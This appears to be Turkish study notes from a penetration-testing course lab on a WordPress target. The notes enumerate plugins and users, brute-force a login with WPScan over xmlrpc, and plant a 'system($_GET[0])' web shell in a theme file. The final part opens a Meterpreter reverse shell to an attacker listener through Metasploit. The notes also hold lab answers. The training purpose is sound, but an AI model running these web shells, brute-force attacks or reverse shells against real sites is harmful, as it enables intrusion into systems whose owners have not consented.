![Pasted image 20241228041438.png](/img/user/resimler/Pasted%20image%2020241228041438.png)

![Pasted image 20241228041457.png](/img/user/resimler/Pasted%20image%2020241228041457.png)

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 19:14 CST
Nmap scan report for app.inlanefreight.local (10.129.4.36)
Host is up (0.065s latency).
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for dev.inlanefreight.local (10.129.4.36)
Host is up (0.065s latency).
rDNS record for 10.129.4.36: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for drupal-dev.inlanefreight.local (10.129.4.36)
Host is up (0.065s latency).
rDNS record for 10.129.4.36: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for drupal-qa.inlanefreight.local (10.129.4.36)
Host is up (0.065s latency).
rDNS record for 10.129.4.36: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for drupal-acc.inlanefreight.local (10.129.4.36)
Host is up (0.065s latency).
rDNS record for 10.129.4.36: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for drupal.inlanefreight.local (10.129.4.36)
Host is up (0.065s latency).
rDNS record for 10.129.4.36: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for blog.inlanefreight.local (10.129.4.36)
Host is up (0.065s latency).
rDNS record for 10.129.4.36: app.inlanefreight.local
Not shown: 6 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

```

![Pasted image 20241228041607.png](/img/user/resimler/Pasted%20image%2020241228041607.png)

![Pasted image 20241228041710.png](/img/user/resimler/Pasted%20image%2020241228041710.png)



Soru :  Aquatone_report.html sayfası bir web tarayıcısı ile açıldığında başlık sayfasındaki header ne diyor? (Format: 3 kelime, büyük/küçük harfe duyarlı)

Cevap : 

![Pasted image 20241228041805.png](/img/user/resimler/Pasted%20image%2020241228041805.png)

![Pasted image 20241228041901.png](/img/user/resimler/Pasted%20image%2020241228041901.png)

![Pasted image 20241228042037.png](/img/user/resimler/Pasted%20image%2020241228042037.png)

![Pasted image 20241228042233.png](/img/user/resimler/Pasted%20image%2020241228042233.png)


# WordPress - Discovery & Enumeration

Bu yazının yazıldığı sırada, WordPress internetteki tüm sitelerin yaklaşık %32,5'ini oluşturmaktadır ve pazar payına göre en popüler CMS'dir. İşte WordPress hakkında bazı ilginç gerçekler.

* WordPress 50.000'den fazla plugin ve 4.100'den fazla GPL lisanslı tema sunar
* WordPress'in ilk lansmanından bu yana 317 ayrı sürümü yayınlandı
* Her gün yaklaşık 661 yeni WordPress web sitesi kuruluyor
* WordPress blogları 120'den fazla dilde yazılmaktadır
* Yapılan bir araştırma, WordPress saldırılarının yaklaşık %8'inin zayıf şifrelerden, %60'ının ise güncel olmayan WordPress sürümünden kaynaklandığını göstermiştir
* WPScan'e göre, bilinen yaklaşık 4.000 güvenlik açığının %54'ü pluginlerden, %31,5'i WordPress core'dan ve %14,5'i WordPress temalarından kaynaklanmaktadır.
* WordPress kullanan bazı büyük markalar arasında The New York Times, eBay, Sony, Forbes, Disney, Facebook, Mercedes-Benz ve çok daha fazlası bulunmaktadır


Bir external penetrasyon testi sırasında WordPress tabanlı bir ana web sitesiyle karşılaştığımızı düşünelim. WordPress, tanımlanmasını sağlayan özgün dosyalara sahiptir. Dosya yapısı, adlar ve PHP script fonksiyonları kurulu WordPress sürümünü keşfetmek için kullanılabilir. Ayrıca, meta veriler HTML kaynak kodunda bulunabilir ve bazen sürüm bilgisi içerir. WordPress hakkında daha fazla bilgi edinmek için hangi olanaklara sahip olduğumuzu inceleyelim.


## Discovery/Footprinting

Bir WordPress sitesini tanımlamanın hızlı bir yolu /robots.txt dosyasına göz atmaktır. Bir WordPress kurulumundaki tipik bir robots.txt şöyle görünebilir:

```shell-session
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```

Burada /wp-admin ve /wp-content dizinlerinin varlığı WordPress ile uğraştığımızı ele verir. Tipik olarak wp-admin dizinine göz atmaya çalışmak bizi wp-login.php sayfasına yönlendirecektir. Bu, WordPress örneğinin back-end'ine giriş portalıdır.

http://blog.inlanefreight.local/wp-login.php

![Pasted image 20241229003905.png](/img/user/resimler/Pasted%20image%2020241229003905.png)

WordPress pluginlerini wp-content/plugins dizininde saklar. Bu klasör, güvenlik açığı olan pluginleri listelemeye yardımcı olur. Temalar wp-content/themes dizininde saklanır. Bu dosyalar RCE'ye yol açabileceğinden dikkatlice numaralandırılmalıdır.

Standart bir WordPress kurulumunda beş tür kullanıcı vardır.

* Administrator (Yönetici): Bu kullanıcının web sitesi içindeki yönetim özelliklerine erişimi vardır. Bu, kullanıcı ve gönderi ekleme ve silmenin yanı sıra kaynak kodunu düzenlemeyi de içerir.
* Editor: Bir editör, diğer kullanıcıların gönderileri de dahil olmak üzere gönderileri yayınlayabilir ve yönetebilir.
* Author (Yazar): Kendi gönderilerini yayınlayabilir ve yönetebilirler.
* Contributor ( Katılımcı): Bu kullanıcılar kendi gönderilerini yazabilir ve yönetebilir ancak yayınlayamazlar.
* Subscriber (Abone): Bunlar, gönderilere göz atabilen ve profillerini düzenleyebilen standart kullanıcılardır.

Bir administrator erişim sağlamak genellikle sunucuda kod çalıştırma elde etmek için yeterlidir. Editörler ve yazarlar, normal kullanıcıların erişemediği bazı savunmasız eklentilere erişebilir.

## Enumeration

Bir WordPress sitesini tespit etmenin bir başka hızlı yolu da sayfa kaynağına bakmaktır. Sayfayı cURL ile görüntülemek ve WordPress için grepping yapmak, WordPress'in kullanımda olduğunu doğrulamamıza ve daha sonra not etmemiz gereken versiyon numarasını footprint  olarak almamıza yardımcı olabilir. WordPress'i çeşitli manuel ve otomatik taktikler kullanarak numaralandırabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress

<meta name="generator" content="WordPress 5.8" /
```

Siteye göz atmak ve sayfa kaynağını incelemek bize kullanılan tema, yüklü pluginler ve hatta yazar adları yazılarla birlikte yayınlanmışsa kullanıcı adları hakkında ipuçları verecektir. Siteye manuel olarak göz atmak ve her sayfa için sayfa kaynağına bakmak, ==wp-content== dizinini, `temaları` ve `pluginleri` aramak için biraz zaman harcamalı ve ilginç veri noktalarının bir listesini oluşturmaya başlamalıyız.

Sayfa kaynağına baktığımızda ==Business Gravity== temasının kullanıldığını görebiliriz. Daha da ileri giderek tema versiyon numarasının parmak izini alabilir ve temayı etkileyen bilinen herhangi bir güvenlik açığı olup olmadığına bakabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes

<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
```

Daha sonra, hangi pluginleri ortaya çıkarabileceğimize bir göz atalım.

```shell-session
M1R4CKCK@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script>
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script>
		<link rel='stylesheet' id='mm_frontend-css'  href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' />
<script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script>
```

Yukarıdaki çıktıdan Contact Form 7 ve mail-masta pluginlerinin kurulu olduğunu biliyoruz. Bir sonraki adım sürümleri listelemek olacaktır.

[http://blog.inlanefreight.local/wp-content/plugins/mail-masta/](http://blog.inlanefreight.local/wp-content/plugins/mail-masta/) adresine göz attığımızda, dizin listelemenin açık olduğunu ve bir **readme.txt** dosyasının bulunduğunu görüyoruz. Bu tür dosyalar, genellikle versiyon numaralarını belirlemek için oldukça faydalıdır. **readme.txt** dosyasından, bu eklentinin Ağustos 2021'de yayımlanmış bir [**Local File Inclusion](https://www.exploit-db.com/exploits/50226) (LFI)** zafiyetine sahip **1.0.0 sürümüne** ait olduğunu anlıyoruz.

Biraz daha inceleyelim. Başka bir sayfanın kaynak kodunu kontrol ettiğimizde, **[wpDiscuz](https://wpdiscuz.com/)** plugininim yüklü olduğunu ve bunun **7.0.4 sürümü** gibi göründüğünü fark ediyoruz.

```shell-session
M1R4CKCK@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p=1 | grep plugins

<link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
```

[Bu](https://www.exploit-db.com/exploits/49967) plugin sürümü için yapılan hızlı bir arama, Haziran 2021'den kalma bu kimliği doğrulanmamış remote code execution güvenlik açığını gösteriyor. Bunu not edip yolumuza devam edeceğiz.


## Enumerating Users

Kullanıcıları manuel olarak da numaralandırabiliriz. Daha önce de belirtildiği gibi, varsayılan WordPress giriş sayfası /wp-login.php adresinde bulunabilir.

Geçerli bir kullanıcı adı ve geçersiz bir şifre aşağıdaki mesajla sonuçlanır:

![Pasted image 20241229035821.png](/img/user/resimler/Pasted%20image%2020241229035821.png)

Ancak, geçersiz bir kullanı![Pasted image 20241229035838.png](/img/user/resimler/Pasted%20image%2020241229035838.png)

Ancak, geçersiz bir kullanıcı adı, kullanıcının bulunamadığını döndürür.

![Pasted image 20241229035838.png](/img/user/resimler/Pasted%20image%2020241229035838.png)

Bu, WordPress'i potansiyel kullanıcı adlarının bir listesini elde etmek için kullanılabilecek kullanıcı adı numaralandırmaya karşı savunmasız hale getirir.

Özetleyelim. Bu aşamada aşağıdaki veri noktalarını topladık:

* Site WordPress core sürüm 5.8'i çalıştırıyor gibi görünüyor
* Yüklü tema Business Gravity
* Aşağıdaki pluginler kullanılmaktadır: Contact Form 7, mail-masta, wpDiscuz
* wpDiscuz versiyonu, kimliği doğrulanmamış remote code execution güvenlik açığından muzdarip olan 7.0.4 olarak görünmektedir
* Mail-masta sürümü 1.0.0 olarak görünmektedir ve Local File Inclusion güvenlik açığından muzdariptir
* WordPress sitesi kullanıcı numaralandırmaya karşı savunmasızdır ve admin kullanıcısının geçerli bir kullanıcı olduğu doğrulanmıştır

Doğrulama . 


## WPScan

WPScan otomatik bir WordPress tarayıcı ve numaralandırma aracıdır. Bir blog tarafından kullanılan çeşitli temaların ve pluginlerin eski veya savunmasız olup olmadığını belirler. Parrot OS'de varsayılan olarak yüklüdür ancak gem ile manuel olarak da kurulabilir.

```shell-session
M1R4CKCK@htb[/htb]$ sudo gem install wpscan
```

WPScan ayrıca external kaynaklardan güvenlik açığı bilgilerini çekebilir. WPScan tarafından PoC ve raporları taramak için kullanılan [WPVulnDB](https://wpvulndb.com/)'den bir API token'ı alabiliriz. Ücretsiz plan günde 75 isteğe kadar izin verir. WPVulnDB veritabanını kullanmak için bir hesap oluşturmanız ve kullanıcılar sayfasından API token'ını kopyalamanız yeterlidir. Bu token daha sonra --api-token parametresi kullanılarak wpscan'e verilebilir.

```shell-session
M1R4CKCK@htb[/htb]$ wpscan -h

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

Usage: wpscan [options]
        --url URL                                 The URL of the blog to scan
                                                  Allowed Protocols: http, https
                                                  Default Protocol if none provided: http
                                                  This option is mandatory unless update or help or hh or version is/are supplied
    -h, --help                                    Display the simple help and exit
        --hh                                      Display the full help and exit
        --version                                 Display the version and exit
    -v, --verbose                                 Verbose mode
        --[no-]banner                             Whether or not to display the banner
                                                  Default: true
    -o, --output FILE                             Output to FILE
    -f, --format FORMAT                           Output results in the format supplied
                                                  Available choices: json, cli-no-colour, cli-no-color, cli
        --detection-mode MODE                     Default: mixed
                                                  Available choices: mixed, passive, aggressive

<SNIP>
```

--enumerate bayrağı WordPress uygulamasının pluginler, temalar ve kullanıcılar gibi çeşitli bileşenlerini listelemek için kullanılır. Varsayılan olarak, WPScan savunmasız pluginleri, temaları, kullanıcıları, medya ve backupları listeler. Ancak, numaralandırmayı belirli bileşenlerle kısıtlamak için belirli argümanlar sağlanabilir. Örneğin, --enumerate ap argümanları kullanılarak tüm pluginler numaralandırılabilir. Bir WordPress web sitesine karşı --enumerate bayrağı ile normal bir numaralandırma taraması başlatalım ve --api-token bayrağı ile WPVulnDB'den bir API tokenı geçirelim.

```shell-session
M1R4CKCK@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>

<SNIP>

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Thu Sep 16 23:11:43 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://blog.inlanefreight.local/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.8</generator>
 |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.8</generator>
 |
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     Fixed in: 5.8.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     Fixed in: 5.8.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     Fixed in: 5.8.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689

[+] WordPress theme in use: transport-gravity
 | Location: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/
 | Latest Version: 1.0.1 (up to date)
 | Last Updated: 2020-08-02T00:00:00.000Z
 | Readme: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css
 | Style Name: Transport Gravity
 | Style URI: https://keonthemes.com/downloads/transport-gravity/
 | Description: Transport Gravity is an enhanced child theme of Business Gravity. Transport Gravity is made for tran...
 | Author: Keon Themes
 | Author URI: https://keonthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css, Match: 'Version: 1.0.1'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)

<SNIP>

| [!] Title: Mail Masta 1.0 - Multiple SQL Injection
      
 <SNIP
 
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

<SNIP>

[i] User(s) Identified:

[+] by:
									admin
 | Found By: Author Posts - Display Name (Passive Detection)

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

WPScan, yukarıdaki raporda gösterildiği gibi sürümleri ve güvenlik açıklarını belirlemek için çeşitli pasif ve aktif yöntemler kullanır. Kullanılan varsayılan thread sayısı 5. Ancak bu değer -t bayrağı kullanılarak değiştirilebilir.

Bu tarama, manuel numaralandırmadan ortaya çıkardığımız bazı şeyleri doğrulamamıza yardımcı oldu (WordPress Core sürüm 5.8 ve directory listing etkin), belirlediğimiz temanın tam olarak doğru olmadığını gösterdi (Business Gravity'nin bir alt teması olan Transport Gravity kullanılıyor), başka bir kullanıcı adını (john) ortaya çıkardı ve otomatik numaralandırmanın genellikle tek başına yeterli olmadığını gösterdi (wpDiscuz ve Contact Form 7 pluginlerini gözden kaçırdı). WPScan bilinen güvenlik açıkları hakkında bilgi sağlar. Rapor çıktısı ayrıca, bu güvenlik açıklarından yararlanmamızı sağlayacak PoC'lere yönelik URL'leri de içerir.

Bu bölümde benimsediğimiz, hem manuel hem de otomatik numaralandırmayı birleştiren yaklaşım, ortaya çıkardığımız hemen hemen her türlü uygulamaya uygulanabilir. 

Elimizle ve WPScan kullanarak topladığımız verilerden şimdi şunları biliyoruz:

- Site **WordPress core sürüm 5.8** üzerinde çalışıyor. Bu sürümde bazı güvenlik açıkları bulunuyor ancak şu noktada ilgi çekici görünmüyor.
- Yüklü tema: **Transport Gravity**.
- Kullanılan plugin: **Contact Form 7**, **mail-masta**, **wpDiscuz**.
- **wpDiscuz** sürümü **7.0.4**, kimlik doğrulaması gerektirmeyen bir **remote code execution** açığı içeriyor.
- **mail-masta** sürümü **1.0.0**, bir **Local File Inclusion** açığına ve **SQL injection** zafiyetine sahip.
- WordPress sitesinde **kullanıcı numaralandırma zafiyeti** var ve `admin` ile `john` kullanıcılarının geçerli olduğu doğrulandı.
- **Directory listing** site genelinde etkin durumda, bu da hassas veri sızmasına yol açabilir.
- **XML-RPC** etkin durumda ve WPScan, Metasploit gibi araçlarla login sayfasına karşı parola brute-forcing saldırısı gerçekleştirmek için kullanılabilir.


Soru : Hostu numaralandırın ve erişilebilir bir dizinde bir flag.txt bayrağı bulun.

Cevap :  http://blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt

Soru : Yüklü başka bir plugin bulmak için manuel numaralandırma gerçekleştirin. plugin adını yanıt olarak gönderin (3 kelime).

Cevap :  WP Sitemap Page

![Pasted image 20241229043118.png](/img/user/resimler/Pasted%20image%2020241229043118.png)



Soru : Bu pluginin versiyon numarasını bulun. (örneğin, 4.5.2)

Cevap : 1.6.4

![Pasted image 20241229043752.png](/img/user/resimler/Pasted%20image%2020241229043752.png)


# Attacking WordPress

Bir WordPress kurulumuna saldırmak için built-in fonksiyonelliğini kötüye kullanabileceğimiz birkaç yol vardır. Wp-login.php sayfasına karşı giriş zorlama ve tema editörü aracılığıyla remote code execution konularını ele alacağız. Administrator-level bir kullanıcının WordPress back-end'e giriş yapması ve bir temayı düzenlemesi için öncelikle geçerli kimlik bilgilerini elde etmemiz gerektiğinden, bu iki taktik birbiri üzerine inşa edilir.

## Login Bruteforce

WPScan, kullanıcı adlarını ve parolaları brute force zorlamak için kullanılabilir. Önceki bölümdeki tarama raporu, web sitesinde kayıtlı iki kullanıcı (admin ve john) döndürdü. Araç, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) ve wp-login olmak üzere iki tür oturum açma brute force saldırısı kullanır. Wp-login yöntemi standart WordPress giriş sayfasını brute force etmeye çalışırken, xmlrpc yöntemi /xmlrpc.php üzerinden giriş denemeleri yapmak için WordPress API'sini kullanır. Daha hızlı olduğu için xmlrpc yöntemi tercih edilir.

```shell-session
[!bash!]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Wed Aug 25 11:56:23 2021

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - john / firebird1                                                                                           
Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: john, Password: firebird1

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Wed Aug 25 11:56:46 2021
[+] Requests Done: 799
[+] Cached Requests: 39
[+] Data Sent: 373.152 KB
[+] Data Received: 448.799 KB
[+] Memory used: 221 MB

[+] Elapsed time: 00:00:23
```

Saldırı türünü belirtmek için --password-attack bayrağı kullanılır. -U bağımsız değişkeni bir kullanıcı listesi veya kullanıcı adlarını içeren bir dosya alır. Bu -P parolaları seçeneği için de geçerlidir. -t bayrağı, bağlı olarak yukarı veya aşağı ayarlayabileceğimiz thread sayısıdır. WPScan bir kullanıcı için geçerli kimlik bilgileri bulabildi, john:firebird1.


## Code Execution

WordPress'e yönetici erişimimiz olduğunda, PHP kaynak kodunu değiştirerek sistem komutları çalıştırabiliriz. **john** kullanıcısının kimlik bilgileriyle WordPress'e giriş yaparak yönetim paneline yönlendiriliriz. Yan panelde **Appearance** (Görünüm) seçeneğine tıklayın ve ardından **Theme Editor** (Tema Düzenleyici) seçeneğini seçin. Bu sayfa, PHP kaynak kodunu doğrudan düzenlememize olanak tanır. Ana temayı bozmayı önlemek için pasif bir tema seçilebilir. Aktif temanın **Transport Gravity** olduğunu zaten biliyoruz. Bunun yerine, **Twenty Nineteen** gibi alternatif bir tema seçilebilir.

Temayı seçtikten sonra **Select** (Seç) düğmesine tıklayın ve bir web shell eklemek için **404.php** gibi yaygın olmayan bir sayfayı düzenleyebiliriz.

```php
system($_GET[0]);
```

Yukarıdaki kod, GET parametresi 0 aracılığıyla komutları çalıştırmamıza izin vermelidir. İçeriğin çok fazla değiştirilmesini önlemek için bu tek satırı yorumların hemen altına dosyaya ekliyoruz.

![Pasted image 20241229175357.png](/img/user/resimler/Pasted%20image%2020241229175357.png)

Kaydetmek için alttaki Update File'a tıklayın. WordPress temalarının `/wp-content/themes/<theme name>` adresinde bulunduğunu biliyoruz. Web shell ile tarayıcı üzerinden ya da cURL kullanarak etkileşime geçebiliriz. Her zaman olduğu gibi, etkileşimli bir reverse shell elde etmek için bu erişimi kullanabilir ve hedefi keşfetmeye başlayabiliriz.

```shell-session
[!bash!]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Metasploit'in [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) modülü bir shell yüklemek ve otomatik olarak çalıştırmak için kullanılabilir.

Modül kötü amaçlı bir plugin yükler ve daha sonra bunu bir PHP Meterpreter shell'i çalıştırmak için kullanır. Öncelikle gerekli seçenekleri ayarlamamız gerekiyor.

```shell-session
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

Daha sonra her şeyin doğru şekilde ayarlandığından emin olmak için show options komutunu verebiliriz. Bu laboratuvar örneğinde, hem vhost hem de IP adresini belirtmeliyiz, aksi takdirde Exploit aborted due to failure: not-found hatası ile başarısız olacaktır: Hedef WordPress kullanıyor gibi görünmüyor.

```shell-session
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting           Required  Description
   ----       ---------------           --------  -----------
   PASSWORD   firebird1                 yes       The WordPress password to authenticate with
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.195             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                        yes       The target port (TCP)
   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                         yes       The base path to the wordpress application
   USERNAME   john                      yes       The WordPress username to authenticate with
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```

Kurulumdan memnun kaldığımızda, exploit yazabilir ve bir reverse shell elde edebiliriz. Buradan, hassas veriler için hostu veya dikey/yatay ayrıcalık yükseltme ve yanal hareket için yolları numaralandırmaya başlayabiliriz.

```shell-session
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Authenticating with WordPress using doug:jessica1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php...
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400
i[+] Deleted wCoUuUPfIO.php
[+] Deleted CczIptSXlr.php
[+] Deleted ../CczIptSXlr

meterpreter > getuid

Server username: www-data (33)
```

Yukarıdaki örnekte, Metasploit modülü wCoUuUPfIO.php dosyasını /wp-content/plugins dizinine yüklemiştir. Birçok Metasploit modülü (ve diğer araçlar) kendilerinden sonra temizlik yapmaya çalışır, ancak bazıları başarısız olur. Bir değerlendirme sırasında, bu yapıyı client sisteminden temizlemek için her türlü girişimi yapmak isteriz ve bu yapıyı kaldırıp kaldıramadığımızdan bağımsız olarak, bu yapıyı rapor eklerimizde listelemeliyiz. En azından raporumuzda aşağıdaki bilgileri listeleyen bir ek bölümü bulunmalıdır - bu konuya daha sonraki bir modülde değineceğiz.

* Exploited edilen sistemler ( hostname/IP ve exploitation yöntemi)
* Ele geçirilen kullanıcılar (hesap adı, ele geçirme yöntemi, hesap türü ( lokal veya domain))
* Sistemler üzerinde oluşturulan nesneler
* Değişiklikler ( lokal admin kullanıcı ekleme veya grup üyeliğini değiştirme gibi)


### Bilinen Güvenlik Açıklarından Yararlanma

